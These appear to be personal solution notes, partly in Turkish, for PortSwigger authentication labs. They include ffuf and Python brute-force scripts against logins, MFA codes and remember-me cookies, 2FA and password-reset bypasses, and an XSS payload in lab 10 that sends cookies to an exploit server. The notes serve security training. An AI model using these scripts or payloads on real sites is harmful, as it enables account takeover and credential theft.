#### 1.Lab: Username enumeration via different responses

We need to execute a brute force attack
- send a Post /login request with data:
- `username=administrador&password=123321`
- see that it returns 200 for invalid requests and a string that says 'Invalid username' 
- now use ffuf:
```
 ffuf -mode clusterbomb -u 'https://0a680083040cd35c80d3d5ab00ae009e.web-security-academy.net/login' -w ./Usernames/PortSwiggerUsernames.txt:BUZZ -w ./Passwords/PortSwiggerPasswords.txt:FUZZ -X POST -d 'username=BUZZ&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: session=uT1mIx4NPVkRc2mK3tPGnQSg7vULHuVO' -fr 'Invalid username' -fr 'Invalid password' -fc 200
```
- this will filter out requests that have 'Invalid username' and 'Invalid password' in it, it will also filter out the request with the status code 200.
- username: appserver
- password: abc123
- Voila, Lab solved!

#### 2.Lab: 2FA simple bypass

Abi labı yanlışlıkla çözdüm
Çözüm:
- Önce wiener:peter ile giriş yapıyoruz
- `GET /my-account?id=wiener HTTP/2` isteğini atıyoruz hesp sayfası için
- Carlos:montoya ile giriş yapıyoruz
- 2FA geldiğinde `GET /my-account?id=carlos HTTP/2` isteğini attığımızda
- 2FA aşmış oluyoruz
- Voila Lab solved!

#### 3.Lab: Password reset broken logic

Password reset kısmında açık var

- execute the forgot password sequence for the user wiener:peter
- you'll see that there is a `POST /forgot-password?temp-forgot-password-token=gbifb6m4x4e21jxynq1ulroqq4jvcnid HTTP/2` request
- in the data section this change the username to carlos:
```
temp-forgot-password-token=gbifb6m4x4e21jxynq1ulroqq4jvcnid&username=wiener&new-password-1=hello&new-password-2=hello
```

to 

```
temp-forgot-password-token=gbifb6m4x4e21jxynq1ulroqq4jvcnid&username=carlos&new-password-1=hello&new-password-2=hello
```

- this way the new password for user carlos is `hello`
- Voila Lab solved!

#### 4.Lab: Username enumeration via subtly different responses

labda az buz farklı cevaplarla enumaration yapılabileceği yazıyor
- ama buna hiç gerek yok dostlar
- ffuf kullanalım hemen
- her derde deva ffuf command:
```
ffuf -mode clusterbomb -u 'https://0a9d00d503f87b3c80cb2bb00061006e.web-security-academy.net/login' -w ./Usernames/PortSwiggerUsernames.txt:BUZZ -w ./Passwords/PortSwiggerPasswords.txt:FUZZ -X POST -d 'username=BUZZ&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie:session=0vMpyK0aXNHlA9nfVpbc5BaApeH6UB2z' -fr 'Invalid username','Incorrect password','Invalid username or password' -fc 200
```
- username: analyzer
- password: 121212
- Voila Lab solved!

#### 5.Lab: Username enumeration via response timing

Labda response time da duruma göre gecikmelerin olabileceği yazıyor, ipuçlarında da aynı IP adresinden fazla istek atılması üzerine application'ın istek kabul etmeyeceği yazıyor,
- Aynı ip adresten birkaç kere login isteği atıyoruz
- Giriş sınırı: 5
- İsteklere gelen cevapta `X-Forwarded-For` ibaresi gördüm
- Bunu kullanarak istek sınırını atlayabiliriz
- Önce geçerli bir username buluyoruz.
- Burp intruder'da önce `X-Forwarded-For` header'ına 101'e kadar payload koyuyoruz
- Username için de aşağıda  `username=PAYLOADGOESHERE&password ...` gibi bir payload'ı SecListten yüklüyoruz.
- Saldırı bitince response time değerlerini incelediğimizde en bir isteğin diğerlerinden daha geç geldiğini görüyoruz.
- Bu username'i bulduk demek
- Ardından yine intruder'a bu sefer password kısmına bir payload koyuyoruz : `username=VALIDUSRNAME&password=PAYLOADGOESHERE` 
- Grep/match kısmına `Invalid username or password` şeklinde bir ifade ekliyoruz
- Bu ifadenin işaretli olmadığı satır bize istediğimiz cevabı verecek 
- Sifre de bulunmuş oldu
- username : root
- password : charlie
- Voila Lab Solved!


#### 6.Lab: Broken brute-force protection, IP block

Bu labda 5 yanlış giriş denemesi yapıldıysa IP block ediliyor. Eğer doğru giriş yapıldıysa da ban kalkıyor. Labda 5 istekte bir elimizdeki `wiener:peter` kullanıcısoyla giriş yapmamız gerekiyor. 
- Ben bunun için bir python kodu yazdım:
- Python Kodu:
```
import requests as r
  

url = "https://0a4d00fa04ea1d6b80be7b05006c00e9.web-security-academy.net/login"
headers = {
    "Host": "0a4d00fa04ea1d6b80be7b05006c00e9.web-security-academy.net",
    "Content-Length": "30",
    "Cache-Control": "max-age=0",
    "X-Forwarded-For": "192.169.100.100",
    "Sec-Ch-Ua": "\"Chromium\";v=\"135\", \"Not-A.Brand\";v=\"8\"",
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "\"Windows\"",
    "Accept-Language": "tr-TR,tr;q=0.9",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "https://0a4d00fa04ea1d6b80be7b05006c00e9.web-security-academy.net",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "https://0a4d00fa04ea1d6b80be7b05006c00e9.web-security-academy.net/login",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=0, i"
}
COOKIES = {"session":"xVlyRPvRiqmzPffMUEqMBK268DZqjMt0"}
u_directory = "SecLists/Usernames/PortSwiggerUsernames.txt"
p_directory = "SecLists/Passwords/PortSwiggerPasswords.txt"

regex_filter = 'You have made too many incorrect login attempts. Please try again in 1 minute(s).'

with open(p_directory,'r') as file:
    passwords = [line.strip() for line in file]

for i in range(0,100):
    payload_1 = f'username=carlos&password={passwords[i]}'
    response = r.post(url=url,headers=headers,cookies=COOKIES,data=payload_1)
    print(f'sending username: carlos with password : {passwords[i]}')
    if (i%4 == 0):
        passreset = r.post(url=url,headers=headers,cookies=COOKIES,data='username=wiener&password=peter')
        print('[IP Reset] : sending username: wiener with password : peter')
    if response.status_code == 302:
        r_pass = passwords[i]
        print(f'right password : {passwords[i]}')
        break
    if regex_filter in response.text:
        print('your code is wrong'.upper())
```

#### 7.Lab: Username enumeration via account lock

Labda fazla denemede account lock var. Farklı durumlarda verilen cevaplara göre username ve password deduction ediyoruz.
- önce hangi username değerinin valid olduğunu bulmak için 'You have made too many attempts' mesajını getirmeye çalışıyoruz
- aşağıdaki ffuf comman'ini beş kere çalıştırarak bunu bulabiliriz:
```
ffuf -u 'https://0a7a0021047324d481e585fd00b4001d.web-security-academy.net/login' -w ./Usernames/PortSwiggerUsernames.txt -X POST -d 'username=FUZZ&password=hellohellohellohellohellohellohellohellohelllo' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: session=sY4m5ub2tY4FCA0L7Zc9ofCiVSGJJHWs' -fs 3132
```
- bu istekte eğer istenen mesaj varsa doğal olarak cevap uzunluğu daha fazla olacağı için diğer mesajları filtreliyoruz.
- Hangi username değerinin valid olduğunu görükten sonra password enumeration için aşağıdaki ffuf command ini çalıştırıyoruz:
```
ffuf -u 'https://0a7a0021047324d481e585fd00b4001d.web-security-academy.net/login' -w ./Passwords/PortSwiggerPasswords.txt -X POST -d 'username=at&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: session=sY4m5ub2tY4FCA0L7Zc9ofCiVSGJJHWs' -fr 'too many','Invalid username or password'
```
Bu ffuf komutu bize doğru değerleri girdiğimizde ortaya çıkan cevap farklılığından dolayı password değerini göstermiş oluyor.

#### 8.Lab: 2FA broken logic

Bu labda email'e bir mfa code gönderiliyor, authentication için
- GET /login2 isteği atıyoruz ki mfa code oluşturulsun
- Ardından Post /login2 isteğinde `Cookie : verify: carlos` gibi bir değişiklik yapıyoruz
- mfa code kısmına da brute force uyguluyoruz.
- Ben bunu bir python scriptiyle gerçekleştirdim:
```
import requests

url = "https://0a2c000b04589c56801e17d300560023.web-security-academy.net/login2"
headers = {
    "Host": "0a2c000b04589c56801e17d300560023.web-security-academy.net",
    "Cache-Control": "max-age=0",
    "Sec-Ch-Ua": '"Not:A-Brand";v="24", "Chromium";v="134"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Accept-Language": "tr-TR,tr;q=0.9",
    "Origin": "https://0a2c000b04589c56801e17d300560023.web-security-academy.net",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "https://0a2c000b04589c56801e17d300560023.web-security-academy.net/login2",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=0, i"
}

cookies = {
    "verify": "carlos",
    "session": "ZUVBmKl3Dzt1Ro8poEjz9Srd3pa717D5"
}

for code in range(10000):  
    mfa_code = f"{code:04d}"
    data = {"mfa-code": mfa_code}
    response = requests.post(url, headers=headers, cookies=cookies, data=data)
    print(f"Trying MFA Code: {mfa_code} - Status Code: {response.status_code}")
    if "Incorrect security code" not in response.text:
        print(f"\n[*] SUCCESS! MFA Code: {mfa_code}\n")
        successful_mfa_code = mfa_code
        break  
print(successful_mfa_code)
```


#### 9.Lab: Brute-forcing a stay-logged-in cookie

Stay-logged-in cookie de brute force açığı var.
- cookie değeri base64 encoded bir değer
- decode ettiğimizde username:AHASHVALUE elde ediyoruz
- bu değeri de decode ettiğimizde password değerini alıyoruz
- brute-force uygulamasını bunu üzerinden yapacağız
- bunun için bir python kodu yazdım:
```
import base64
import hashlib
import requests as r

def encode_base64(value: str) -> str:
    encoded_bytes = base64.b64encode(value.encode('utf-8'))
    return encoded_bytes.decode('utf-8')

def encode_md5(value: str) -> str:
    md5_hash = hashlib.md5(value.encode('utf-8'))
    return md5_hash.hexdigest()

url = "https://0ae100b60453143d80f1f90700be00f6.web-security-academy.net/my-account?id=carlos"
headers = {
    "Host": "0ae100b60453143d80f1f90700be00f6.web-security-academy.net",
    "Content-Length": "30",
    "Cache-Control": "max-age=0",
    "X-Forwarded-For": "192.169.100.100", 
    "Sec-Ch-Ua": "\"Chromium\";v=\"135\", \"Not-A.Brand\";v=\"8\"",
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "\"Windows\"",
    "Accept-Language": "tr-TR,tr;q=0.9",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "https://0ae100b60453143d80f1f90700be00f6.web-security-academy.net",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "https://0ae100b60453143d80f1f90700be00f6.web-security-academy.net/my-account?id=carlos",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=0, i"
}
cookies = {"stay-logged-in": "d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw", 
           "session": "dPvKkmZsDjfI4TSrxVAwM7MQw1PEAM0G"}

p_directory = "SecLists/Passwords/PortSwiggerPasswords.txt"

with open(p_directory,'r') as file:
    passwords = [line.strip() for line in file]

encoded_verification = []
for i in passwords:
    p_md5 = encode_md5(i)
    temp_str = f'carlos:{p_md5}'
    p_md5_64 = encode_base64(temp_str)
    encoded_verification.append(p_md5_64)
suc =''
for i in encoded_verification:
    cookies["stay-logged-in"] = i
    response = r.get(url=url,headers=headers,cookies=cookies)
    print(f'sending get with: {i}, response time: {response.elapsed}, statuse code: {response.status_code}, size: {len(response.content)}')
    if 'your username is: carlos' in response.text:
        print(f'successful: {i}')
        succ = i
        break

print(base64.b64decode(succ))
```

#### 10.Lab: Offline password cracking

Bir önceki labdaki aynı cookie mantığı var
- comment kısmında XSS açığı var
- denemek için `<script>alert(10)</script>` yazıp yüklüyoruz sayfayı tekrar istediğimizde alert geliyor
- ardından `<script>document.location='exploit-0a5f004904163aea80530c1a013800df.exploit-server.net/'+document.cookie</script>`
- scriptini giriyoruz
- exploit server da `10.0.4.58 2025-04-30 11:27:23 +0000 "GET/secret=X4DXSfy3JFGdLW9LSEAhzCZpqbAOzmKq;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz` gibi bir ibare çıkıyor
- bunu decode ettiğimizde şifre `onceuponatime` çıkıyor
- giriş yaparak siliyoruz hesabı

#### 11.Lab: Password reset poisoning via middleware

- Post /forgot-password isteğinde X-Forwarded-Host başlığının desteklendiğini görüyoruz
- Bu başlığı ekleyip değerini exploit server linkimizi koyuyoruz:
- `exploit-0a2a009f03674a4d810f8329012000f7.exploit-server.net`
- Ardından username değerini carlos olarak değiştiriyoruz ve gönderiyoruz
- Exploit serverdan loglara baktığımızda carlos adına bir token görünüyor `c6kheysd5kboz3im5axe8o3l3cpbrkd6`
- bu tokeni daha önceden hazırladığımız `https://0ac6006803944a59811c845e00a0000e.web-security-academy.net/forgot-password?temp-forgot-password-token=c6kheysd5kboz3im5axe8o3l3cpbrkd6` linkindeki token kısmına yaerleştiriyoruz.
- password reset sayfasında carlosun şifresini değiştirip onun hesabına giriş yapıyoruz
- Voila Lab Solved.


#### 12.Lab: Password brute-force via password change

Labda şifre değiştirme mekaniğinde brute-force uygulanabilir olduğu söyleniyor.
- wiener:peter değerleri ile giriş yap
- şifre değiştirme durumlarını dene
	- önceki şifre uymayıp sonraki şifreler uyarsa giriş ekranına tekrar dönülür
	- önceki şifre yanlışsa, yeni şifreler de uymazsa birbirine 'Current password is incorrect' mesajı verilir
	- önceki şifre doğruysa ve yeni şifreler birbirine uymazsa 'New passwords do not match' mesajı verilir
- Bu şartları göze alarak aşağıdaki ffuf komutu girilirse şifre bulunur

```
ffuf -w ./Passwords/PortSwiggerPasswords.txt -u https://0a1800af0367606984a2bed600e8009e.web-security-academy.net/my-account/change-password -d 'username=carlos&current-password=FUZZ&new-password-1=boiler&new-password-2=toilet' -b 'session=Kz8mN1KZfQgSf3E4kQxK4r9OyYWvJ39V; session=EQcfc7vVvUYU9Qld6Qh7eeftQ1A5O5j1' -fr 'incorrect'
```

#### 13.Lab: Broken brute-force protection, multiple credentials per request

Gönderilen dizideki değerler şifre olarak deneniyor serverda
Adımlar
-  login isteği at
- username ve password JSON formatında gönderilmekte
- password yerine bir candidate password listesini yaz gönder
- yanıtı browser da aç
#### 14.Lab: 2FA bypass using a brute-force attack

